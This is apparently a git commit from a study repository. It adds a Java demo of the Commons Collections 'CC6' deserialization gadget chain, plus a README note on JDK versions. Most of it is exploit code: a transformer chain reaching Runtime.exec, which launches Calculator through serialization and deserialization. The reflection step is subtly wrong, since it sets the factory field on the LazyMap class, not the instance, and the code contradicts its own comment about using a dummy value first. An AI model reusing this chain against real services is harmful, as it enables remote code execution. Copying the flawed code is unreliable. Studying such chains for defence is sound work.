91679ed7c94d1ecfba0d7de137bfe1e4c06de6d5
Zhengyuan Wang <zhengyuan.wang@thoughtworks.com>
2023-01-09 15:28:08 +0800

    feat: add CC6 demo

---
+++ src/main/java/commensCollections6/CC6_Test.java
@@ -0,0 +1,81 @@
+package commensCollections6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6_Test {
+    public static void main(String[] args) throws Exception {
+        Runtime r = Runtime.getRuntime();
+//        InvokerTransformer invokerTransformer = new InvokerTransformer(
+//                "exec",
+//                new Class[]{String.class},
+//                new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"});
+
+//        换链子
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"})
+        };
+
+//        换chainedTransformer
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
+
+        HashMap<Object, Object> expMap = new HashMap<>();
+        expMap.put(tiedMapEntry, "value");
+
+//        put之后通过反射修改值, 防止序列化的时候就弹计算器
+
+/*
+与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。
+在我们 CC6 的链子当中，通过修改这一句语句 Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);可以达到我们需要的效果。
+
+我们之前传进去的参数是 chainedTransformer，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 chainedTransformer。
+相关的属性值在 LazyMap 当中为 factory
+*/
+        Class<LazyMap> lazyMapClass = LazyMap.class;
+        Field lazyMapClassDeclaredField = lazyMapClass.getDeclaredField("factory");
+        lazyMapClassDeclaredField.setAccessible(true);
+        lazyMapClassDeclaredField.set(lazyMapClass, chainedTransformer);
+
+
+        serialize(expMap);
+        deserialize("ser.bin");
+
+//        tiedMapEntry.getValue();
+
+//        lazyMap的前半条链子的EXP
+//        HashMap<Object, Object> hashMap = new HashMap<>();
+//        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);
+//
+//        Class<LazyMap> lazyMapClass = LazyMap.class;
+//        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
+//        lazyGetMethod.setAccessible(true);
+//        lazyGetMethod.invoke(decorateMap, r);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object deserialize(String fileName) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
--- src/main/java/commensCollections6/README.md
+++ src/main/java/commensCollections6/README.md
@@ -1,5 +1,11 @@
 ### Requirements
 
+CC1的要求比较严格，但是CC6可以不受到jdk版本制约
+
+#### CC6 = CC1 + URLDNS
+
+为了方便，环境可以用与CC1相同的或者用jdk8u71(71中已经修复了CC1的漏洞)
+
 JDK8u65
 
 OpenJDK 8U65 与CC1相同替换sun包将.class替换为未编译的.java文件，方便debug
